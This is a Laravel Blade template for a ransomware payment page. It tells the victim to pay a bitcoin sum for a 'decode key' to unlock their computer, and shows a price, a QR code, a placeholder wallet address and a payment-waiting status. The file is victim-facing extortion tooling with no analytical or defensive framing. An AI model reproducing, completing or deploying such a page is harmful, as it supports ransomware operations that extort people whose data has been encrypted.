 @extends('layout.auth')

 @section('content')

	<div class="row">
        <div class="col-md-12">
            <div class="card">
            	<div class="card-header" style="background-image: url(http://i.imgur.com/4Qke0Bg.jpg);">	
            	</div>
                <div class="card-block">
                    <div class="card-title-block">
                    	
						<div class="row">
	                    	<div class="col-sm-9">
	                        	<h3 class="title"> {{ __("Pay for Decode key") }} </h3>
	                        	<small>{{ __("Once you have paid, you will receive your decode key to unlock your computer") }}</small>
	                    	</div>
	                    	<div class="col-sm-3">
								<i class="fa fa-btc"></i> {{ Config('website.price') }}<br/>
								<i class="fa fa-usd"></i> 1903.00

	                    	</div>
	                    </div>

	                    <div class="row">

							<hr>
								<div class="col-sm-12">
									<div class="pull-left" style="margin-top:5px;">
										{{ __("Pay using Blockchain") }}
									</div>
									<div class="pull-right">
										<a href="http://blockchain.info" class="btn btn-default btn-sm" target="_blank">
											{{ __("Visit Blockchain") }}
										</a>
									</div>
								</div>

						</div>

						<div class="row">
							<hr>
						</div>

						<div class="row">

							<div class="col-sm-4">
								<img style="width: 100%;" src="https://chart.googleapis.com/chart?chs=150x150&cht=qr&chl=Hello%20world&choe=UTF-8">
							</div>	
							<div class="col-sm-8">
								{!! __("Send exactly %s %s  BTC to this address ", '<i class="fa fa-btc"></i>', Config('website.price')) !!}
								<div class="form-group" style="margin-top: 10px;">
									<input type="text" name="btc" value="12343258439345u8384u5" readonly="" class="form-control input-sm">
									<button class="btn btn-default btn-sm" style="margin-top:10px;">{{ __("Copy bitcoin Address") }}</button>
								</div>
							</div>	

						</div>

						<div class="row">

							<hr>

						</div>

						<div class="row">
							<div class="col-sm-12 text-center">
								<button class="btn btn-lg btn-default">
									{{ __("Waiting for payment") }}
								</button>
							</div>
						</div>
						<div class="row">
							<div class="col-sm-12 text-center">
								<br/><small style="padding:10px;">{{ __("Note: you must send the exact amount of Bitcoins, including the miners fee otherwise our sysem will ignore it") }}</small>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>

 @stop	

@push('style')
<style>
	.card-header
	{
		position: relative;
	    padding: 30px;
	    text-align: center;
	    height: 180px;
	    background-position: center;
	    background-size: cover;
	    border-bottom: 1px solid;
	}
</style>
@endpush